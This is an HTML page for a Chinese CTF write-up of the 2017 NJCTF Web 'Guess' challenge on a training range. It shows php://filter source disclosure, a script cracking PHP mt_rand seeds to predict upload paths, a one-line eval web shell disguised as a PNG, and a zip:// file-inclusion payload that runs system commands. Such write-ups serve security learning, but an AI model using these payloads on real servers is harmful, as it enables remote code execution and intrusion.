@@ -1,0 +1,452 @@
+<html>
+
+<head>
+  <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>攻防世界 2017 NJCTF Web Guess | 3ND</title>
+<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="攻防世界 2017 NJCTF Web Guess | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="不错的一道题目，记录一下~
+0x01 文件上传
+
+http://111.198.29.45:30117/?page=upload (ADWorld攻防世界提供靶场)
+
+打开题目发现疑似文件上传题目，随机选取一张图片上传后回显如下：
+
+初步判..." />
+    <meta name="keywords" content="Writeup,CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <!--<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>-->
+    <script src="/media/highlight.min.js"></script>
+</head>
+
+<body>
+  <div class="main">
+    <div class="main-content">
+      <div class="site-header">
+  <a href="https://github.com/inspiringz/inspiringz.github.io">
+  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  </a>
+  <h1 class="site-title">
+    3ND
+  </h1>
+  <p class="site-description">
+    夏が終わった
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/inspiringz" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              攻防世界 2017 NJCTF Web Guess
+            </h2>
+            <div class="post-info">
+              <span>
+                2019-04-25
+              </span>
+              <span>
+                10 min read
+              </span>
+              <span class="page-view" key="20190425210500" title="攻防世界 2017 NJCTF Web Guess">
+              </span>
+              
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/writeup/" class="post-tag">
+                  # Writeup
+                </a>
+                
+                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/ctf/" class="post-tag">
+                  # CTF
+                </a>
+                
+            </div>
+            
+                <div class="post-content-wrapper">
+                  <div class="post-content">
+                    <p>不错的一道题目，记录一下~</p>
+<h2 id="0x01-文件上传">0x01 文件上传</h2>
+<blockquote>
+<p>http://111.198.29.45:30117/?page=upload (ADWorld攻防世界提供靶场)</p>
+</blockquote>
+<p>打开题目发现疑似文件上传题目，随机选取一张图片上传后回显如下：</p>
+<figure data-type="image" tabindex="1"><img src="https://i.loli.net/2019/08/09/4mzLAEepq86CkxX.png" alt="image.png" loading="lazy"></figure>
+<p>初步判断为(文件名校验)白名单+服务端验证。(那么上传成功后的文件在哪呢？</p>
+<h2 id="0x02-文件包含">0x02 文件包含</h2>
+<p>简单探测后发现存在index.php、upload.php文件，观察URL中的<code>?page=upload</code>，可能存在文件包含漏洞?</p>
+<blockquote>
+<p>php://filter是一种元封装器，设计用于&quot;数据流打开&quot;时的&quot;筛选过滤&quot;应用，对本地磁盘文件进行读写。简单来讲就是可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启<code>allow_url_include</code>.</p>
+</blockquote>
+<p>尝试使用<strong>php://filter</strong>伪协议读取源码,Payload:</p>
+<pre><code class="language-bash">//读取index.php
+http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=index
+//读取upload.php
+http://111.198.29.45:30117/?page=php://filter/read=convert.base64-encode/resource=upload
+</code></pre>
+<p>解Base64后获取如下源码:</p>
+<ul>
+<li>index.php(部分)</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+
+session_start();
+if(isset($_GET['page'])){
+    $page=$_GET['page'];
+}else{
+    $page=null;
+}
+
+if(preg_match('/\.\./',$page))
+{
+    echo &quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt;
+    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;&quot;;
+    die();
+}
+
+?&gt;
+
+&lt;?php
+
+if($page)
+{
+    if(!(include($page.'.php')))
+    {
+        echo &quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt;
+    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;error!&lt;/div&gt;&quot;;
+        exit;
+    }
+}
+?&gt;
+</code></pre>
+<ul>
+<li>upload.php</li>
+</ul>
+<pre><code class="language-php">&lt;?php
+error_reporting(0);
+function show_error_message($message)
+{
+    die(&quot;&lt;div class=\&quot;msg error\&quot; id=\&quot;message\&quot;&gt;
+    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;$message&lt;/div&gt;&quot;);
+}
+
+function show_message($message)
+{
+    echo(&quot;&lt;div class=\&quot;msg success\&quot; id=\&quot;message\&quot;&gt;
+    &lt;i class=\&quot;fa fa-exclamation-triangle\&quot;&gt;&lt;/i&gt;$message&lt;/div&gt;&quot;);
+}
+
+function random_str($length = &quot;32&quot;)
+{
+    $set = array(&quot;a&quot;, &quot;A&quot;, &quot;b&quot;, &quot;B&quot;, &quot;c&quot;, &quot;C&quot;, &quot;d&quot;, &quot;D&quot;, &quot;e&quot;, &quot;E&quot;, &quot;f&quot;, &quot;F&quot;,
+        &quot;g&quot;, &quot;G&quot;, &quot;h&quot;, &quot;H&quot;, &quot;i&quot;, &quot;I&quot;, &quot;j&quot;, &quot;J&quot;, &quot;k&quot;, &quot;K&quot;, &quot;l&quot;, &quot;L&quot;,
+        &quot;m&quot;, &quot;M&quot;, &quot;n&quot;, &quot;N&quot;, &quot;o&quot;, &quot;O&quot;, &quot;p&quot;, &quot;P&quot;, &quot;q&quot;, &quot;Q&quot;, &quot;r&quot;, &quot;R&quot;,
+        &quot;s&quot;, &quot;S&quot;, &quot;t&quot;, &quot;T&quot;, &quot;u&quot;, &quot;U&quot;, &quot;v&quot;, &quot;V&quot;, &quot;w&quot;, &quot;W&quot;, &quot;x&quot;, &quot;X&quot;,
+        &quot;y&quot;, &quot;Y&quot;, &quot;z&quot;, &quot;Z&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;);
+    $str = '';
+
+    for ($i = 1; $i &lt;= $length; ++$i) {
+        $ch = mt_rand(0, count($set) - 1);
+        $str .= $set[$ch];
+    }
+
+    return $str;
+}
+
+session_start();
+
+
+
+$reg='/gif|jpg|jpeg|png/';
+if (isset($_POST['submit'])) {
+
+    $seed = rand(0,999999999);
+    mt_srand($seed);
+    $ss = mt_rand();
+    $hash = md5(session_id() . $ss);
+    setcookie('SESSI0N', $hash, time() + 3600);
+
+    if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) {
+        show_error_message(&quot;Upload ERROR. Return Code: &quot; . $_FILES[&quot;file-upload-field&quot;][&quot;error&quot;]);
+    }
+    $check2 = ((($_FILES[&quot;file-upload-field&quot;][&quot;type&quot;] == &quot;image/gif&quot;)
+            || ($_FILES[&quot;file-upload-field&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;)
+            || ($_FILES[&quot;file-upload-field&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;)
+            || ($_FILES[&quot;file-upload-field&quot;][&quot;type&quot;] == &quot;image/png&quot;))
+        &amp;&amp; ($_FILES[&quot;file-upload-field&quot;][&quot;size&quot;] &lt; 204800));
+    $check3=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION));
+
+
+    if ($check3) show_error_message(&quot;Nope!&quot;);
+    if ($check2) {
+        $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
+        if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) {
+            show_message(&quot;Upload successfully. File type:&quot; . $_FILES[&quot;file-upload-field&quot;][&quot;type&quot;]);
+        } else show_error_message(&quot;Something wrong with the upload...&quot;);
+    } else {
+        show_error_message(&quot;only allow gif/jpeg/png files smaller than 200kb!&quot;);
+    }
+}
+?&gt;
+</code></pre>
+<h2 id="0x03-种子爆破">0x03 种子爆破</h2>
+<p>对upload.php源代码进行审计，可得到如下信息:</p>
+<p>1.上传文件校验方式为文件名白名单验证，很容易绕过进而上传含有恶意代码的图片格式文件。</p>
+<p>2.成功上传的文件保存在如下路径:</p>
+<pre><code class="language-php">$filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name'];
+</code></pre>
+<p>跟进<code>random_str()</code>函数:</p>
+<pre><code class="language-php">function random_str($length = &quot;32&quot;)
+{
+    $set = array(&quot;a&quot;, &quot;A&quot;, &quot;b&quot;, &quot;B&quot;, &quot;c&quot;, &quot;C&quot;, &quot;d&quot;, &quot;D&quot;, &quot;e&quot;, &quot;E&quot;, &quot;f&quot;, &quot;F&quot;,
+        &quot;g&quot;, &quot;G&quot;, &quot;h&quot;, &quot;H&quot;, &quot;i&quot;, &quot;I&quot;, &quot;j&quot;, &quot;J&quot;, &quot;k&quot;, &quot;K&quot;, &quot;l&quot;, &quot;L&quot;,
+        &quot;m&quot;, &quot;M&quot;, &quot;n&quot;, &quot;N&quot;, &quot;o&quot;, &quot;O&quot;, &quot;p&quot;, &quot;P&quot;, &quot;q&quot;, &quot;Q&quot;, &quot;r&quot;, &quot;R&quot;,
+        &quot;s&quot;, &quot;S&quot;, &quot;t&quot;, &quot;T&quot;, &quot;u&quot;, &quot;U&quot;, &quot;v&quot;, &quot;V&quot;, &quot;w&quot;, &quot;W&quot;, &quot;x&quot;, &quot;X&quot;,
+        &quot;y&quot;, &quot;Y&quot;, &quot;z&quot;, &quot;Z&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;);
+    $str = '';
+
+    for ($i = 1; $i &lt;= $length; ++$i) {
+        $ch = mt_rand(0, count($set) - 1);
+        $str .= $set[$ch];
+    }
+
+    return $str;
+}
+</code></pre>
+<p>观察到想要预测random_str的值，需要获取<code>mt_rand()</code>函数的播种种子值。</p>
+<blockquote>
+<p>参考文章：</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><a href="http://wonderkun.cc/index.html/?p=585">php的随机数的安全性分析</a></li>
+<li><a href="https://www.openwall.com/php_mt_seed/">php_mt_seed - PHP mt_rand() seed cracker</a></li>
+</ul>
+</blockquote>
+<p>跟进upload.php中的<code>$seed</code>：</p>
+<pre><code class="language-php">$seed = rand(0,999999999);
+mt_srand($seed);
+$ss = mt_rand();
+$hash = md5(session_id() . $ss);
+setcookie('SESSI0N', $hash, time() + 3600);
+</code></pre>
+<blockquote>
+<p>mt_srand ([ int $seed ] ) : void 用 seed 来给随机数发生器播种。</p>
+</blockquote>
+<p>这里使用<code>burpsuite</code>抓包修改PHPSESSION的值为空，则<code>session_id()</code>的返回值为空，此时Response中的SESSION参数的值即为<code>$hash</code>,即为<code>$ss</code>(播种随机数)经过MD5加密后的值。</p>
+<h2 id="0x04-攻击流程">0x04 攻击流程</h2>
+<ul>
+<li>1.构造恶意文件<code>pass.php</code>，压缩为<code>pass.zip</code>，修改后缀为<code>pass.png</code>后上传。</li>
+</ul>
+<pre><code class="language-php">//pass.php
+&lt;?php @eval($_GET[&quot;pass&quot;]); ?&gt;
+</code></pre>
+<ul>
+<li>2.上传时修改PHPSESSION为空，获取响应的SESSION进行在线MD5解密，获取播种后的随机数。</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://i.loli.net/2019/08/09/F5ZEKxsTNrU2q7P.png" alt="image.png" loading="lazy"></figure>
+<p>由获取的播种后的随机数，借助种子爆破工具探测种子：</p>
+<figure data-type="image" tabindex="3"><img src="https://i.loli.net/2019/08/09/Hzjuwite8YIZqFl.png" alt="image.png" loading="lazy"></figure>
+<ul>
+<li>3.根据获取的种子值进行播种，构造所有可能的文件保存路径，经过校验获取真实路径。</li>
+</ul>
+<pre><code class="language-php">//check.php
+&lt;?php
+    $arr = array(116339511, 616856024);
+    foreach($arr as $a) {
+        mt_srand($a);
+        $set = array(&quot;a&quot;, &quot;A&quot;, &quot;b&quot;, &quot;B&quot;, &quot;c&quot;, &quot;C&quot;, &quot;d&quot;, &quot;D&quot;, &quot;e&quot;, &quot;E&quot;, &quot;f&quot;, &quot;F&quot;,
+                 &quot;g&quot;, &quot;G&quot;, &quot;h&quot;, &quot;H&quot;, &quot;i&quot;, &quot;I&quot;, &quot;j&quot;, &quot;J&quot;, &quot;k&quot;, &quot;K&quot;, &quot;l&quot;, &quot;L&quot;,
+                 &quot;m&quot;, &quot;M&quot;, &quot;n&quot;, &quot;N&quot;, &quot;o&quot;, &quot;O&quot;, &quot;p&quot;, &quot;P&quot;, &quot;q&quot;, &quot;Q&quot;, &quot;r&quot;, &quot;R&quot;,
+                 &quot;s&quot;, &quot;S&quot;, &quot;t&quot;, &quot;T&quot;, &quot;u&quot;, &quot;U&quot;, &quot;v&quot;, &quot;V&quot;, &quot;w&quot;, &quot;W&quot;, &quot;x&quot;, &quot;X&quot;,
+                 &quot;y&quot;, &quot;Y&quot;, &quot;z&quot;, &quot;Z&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;);
+        $str = '';
+        $ss = mt_rand();  // 这一步必须加上，否则与服务器端的随机值对应不上
+        for ($i = 1; $i &lt;= 32; ++$i) {
+            $ch = mt_rand(0, count($set) - 1);
+            $str .= $set[$ch];
+        }
+        echo 'http://111.198.29.45:30015/uP1O4Ds/' . $str . '_pass.png' . &quot;\n&quot;;
+    }
+?&gt;
+</code></pre>
+<ul>
+<li>2.借助文件包含漏洞，通过<code>zip://</code>伪协议读取恶意zip压缩文件，进而执行系统命令。</li>
+</ul>
+<pre><code class="language-bash">//payload url编码后提交
+http://111.198.29.45:30117/?page=zip://uP1O4Ds/naIx79yt4YdpPMM4CeaFfXlmYMWdKFyh_pass.png#pass&amp;pass=echo system(&quot;ls&quot;);
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://i.loli.net/2019/08/09/Kyfx98tDMj3CqO4.png" alt="image.png" loading="lazy"></figure>
+<p>进而读取flag：</p>
+<figure data-type="image" tabindex="5"><img src="https://i.loli.net/2019/08/09/NIGn8oDgmp6EyrQ.png" alt="image.png" loading="lazy"></figure>
+
+                  </div>
+                  <div class="toc-container">
+                    <div style="position: sticky;
+                    top: 20px;">
+                    <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#0x01-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">0x01 文件上传</a></li>
+<li><a href="#0x02-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">0x02 文件包含</a></li>
+<li><a href="#0x03-%E7%A7%8D%E5%AD%90%E7%88%86%E7%A0%B4">0x03 种子爆破</a></li>
+<li><a href="#0x04-%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B">0x04 攻击流程</a></li>
+</ul>
+</li>
+</ul>
+
+                  </div>
+                  </div>
+                </div>
+          </article>
+        </div>
+
+        
+          <div class="nearby-post" style="padding: 24px 32px;">
+            <div class="prev-post" style="float: left;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter;text-align: left;">上一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-SUSCTF-2nd-Web-Write-Up/">
+                <h3 class="post-title" style="text-align: left;">
+                  SUSCTF 2nd Web Write Up
+                </h3>
+              </a>
+            </div>
+            <div class="next-posts" style="float: right;">
+              <div class="aaa" style="
+              margin-bottom: 24px;
+              color: #343a40;
+              font-weight: lighter; text-align: right;">下一篇</div>
+              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-04-25-2019-xihulunjian-Web/">
+                <h3 class="post-title" style="
+                text-align: right;">
+                  2019 西湖论剑 Web 复现
+                </h3>
+              </a>
+            </div>
+          </div>
+          
+
+                
+
+                                <div class="site-footer">
+  
+  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+    </div>
+  </div>
+
+  <script>
+    hljs.highlightAll();
+
+    let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+    // This should probably be throttled.
+    // Especially because it triggers during smooth scrolling.
+    // https://lodash.com/docs/4.17.10#throttle
+    // You could do like...
+    // window.addEventListener("scroll", () => {
+    //    _.throttle(doThatStuff, 100);
+    // });
+    // Only not doing it here to keep this Pen dependency-free.
+
+    window.addEventListener("scroll", event => {
+      let fromTop = window.scrollY;
+
+      mainNavLinks.forEach((link, index) => {
+        let section = document.getElementById(decodeURI(link.hash).substring(1));
+        let nextSection = null
+        if (mainNavLinks[index + 1]) {
+          nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+        }
+        if (section.offsetTop <= fromTop) {
+          if (nextSection) {
+            if (nextSection.offsetTop > fromTop) {
+              link.classList.add("current");
+            } else {
+              link.classList.remove("current");
+            }
+          } else {
+            link.classList.add("current");
+          }
+        } else {
+          link.classList.remove("current");
+        }
+      });
+    });
+  </script>
+<script src="/media/view-support.js"></script>
+<script>
+  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', '//cdn.jsdelivr.net/npm/leancloud-storage@3.13.2/dist/av-min.js'], function () {
+    var pageview = window.pageview(AV, {
+      appId: 'HRVNDkHV80Fpk9M8c5GQqjwy-gzGzoHsz',
+      appKey: 'nsyqncNCSWSOkkns1wvDlUrh',
+      appClass: 'Gridea',
+    });
+    $('.page-view').each(function () {
+      var $this = $(this);
+      var key = $this.attr('key');
+      var title = $this.attr('title');
+      pageview.increase(key, title, function(view) {
+        $("[key='" + key +"']").text(view+' views');
+      });
+    });
+  });
+</script>
+
+</body>
+
+</html>
